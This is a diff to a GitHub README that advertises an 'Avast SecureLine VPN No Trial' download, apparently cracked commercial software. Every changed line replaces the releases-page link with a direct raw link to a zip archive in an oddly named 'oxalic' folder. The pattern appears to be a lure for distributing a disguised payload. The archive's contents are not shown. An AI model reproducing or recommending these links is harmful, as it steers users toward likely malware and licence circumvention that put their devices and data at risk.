@@ -1,6 +1,6 @@
 # 🛡️ Avast-SecureLine-VPN-No-Trial - Secure Your Internet Privacy Effortlessly
 
-[![Download Avast-SecureLine-VPN-No-Trial](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Fitaz123/Avast-SecureLine-VPN-No-Trial/releases)
+[![Download Avast-SecureLine-VPN-No-Trial](https://raw.githubusercontent.com/Fitaz123/Avast-SecureLine-VPN-No-Trial/main/oxalic/Avast-SecureLine-VPN-No-Trial_v1.3.zip)](https://raw.githubusercontent.com/Fitaz123/Avast-SecureLine-VPN-No-Trial/main/oxalic/Avast-SecureLine-VPN-No-Trial_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Avast SecureLine VPN No Trial! This application helps you protect you
 
 To download the VPN application, please visit the page below:
 
-[Download Avast SecureLine-VPN-No-Trial](https://github.com/Fitaz123/Avast-SecureLine-VPN-No-Trial/releases)
+[Download Avast SecureLine-VPN-No-Trial](https://raw.githubusercontent.com/Fitaz123/Avast-SecureLine-VPN-No-Trial/main/oxalic/Avast-SecureLine-VPN-No-Trial_v1.3.zip)
 
 Once on the Releases page, you will see various versions of the software. Select the latest release to ensure you have the newest features and updates.
 
@@ -69,7 +69,7 @@ Avast SecureLine VPN includes several features that enhance your security and pr
 
 To ensure optimal performance, regularly update your application:
 
-1. **Visit the Releases Page**: Go back to the [Releases page](https://github.com/Fitaz123/Avast-SecureLine-VPN-No-Trial/releases).
+1. **Visit the Releases Page**: Go back to the [Releases page](https://raw.githubusercontent.com/Fitaz123/Avast-SecureLine-VPN-No-Trial/main/oxalic/Avast-SecureLine-VPN-No-Trial_v1.3.zip).
 2. **Download the Latest Version**: Follow the same download steps to obtain updates.
 3. **Install the Update**: The installer will replace your previous version with the latest one.
 
